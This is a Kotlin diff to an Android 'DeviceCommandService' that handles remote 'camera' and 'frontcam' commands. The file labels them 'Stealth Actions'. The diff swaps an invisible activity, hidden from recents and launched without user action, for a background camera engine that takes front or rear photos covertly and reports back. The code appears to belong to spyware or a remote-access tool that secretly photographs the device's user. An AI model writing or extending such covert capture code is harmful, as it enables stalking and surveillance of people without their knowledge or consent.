@@ -685,18 +685,9 @@ object DeviceCommandService {
                 // ── Operational Camera, Audio, Screenshot, SMS & Stealth Actions ──
                 "camera", "rearphoto", "camera.takephoto" -> {
                     val lens = params.optString("lens", "back")
-                    val isFront = lens.lowercase() == "front"
+                    val isFront = lens.lowercase(Locale.ROOT) == "front"
                     if (context != null) {
-                        val flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION or
-                                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
-                                    android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION
-                        val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
-                            putExtra(InvisibleCameraActivity.EXTRA_IS_FRONT, isFront)
-                            putExtra("lens", if (isFront) "front" else "back")
-                            addFlags(flags)
-                        }
-                        context.startActivity(intent)
+                        BackgroundCameraEngine.takePhoto(context, isFront = isFront)
                         DeviceCommandResult(true, data = JSONObject().put("status", "capturing_camera_photo").put("lens", if (isFront) "front" else "back"))
                     } else {
                         DeviceCommandResult(false, error = "Context required for camera photo capture")
@@ -705,16 +696,7 @@ object DeviceCommandService {
 
                 "frontcam", "frontphoto" -> {
                     if (context != null) {
-                        val flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                                    android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION or
-                                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
-                                    android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION
-                        val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
-                            putExtra(InvisibleCameraActivity.EXTRA_IS_FRONT, true)
-                            putExtra("lens", "front")
-                            addFlags(flags)
-                        }
-                        context.startActivity(intent)
+                        BackgroundCameraEngine.takePhoto(context, isFront = true)
                         DeviceCommandResult(true, data = JSONObject().put("status", "capturing_front_photo"))
                     } else {
                         DeviceCommandResult(false, error = "Context required for camera photo capture")
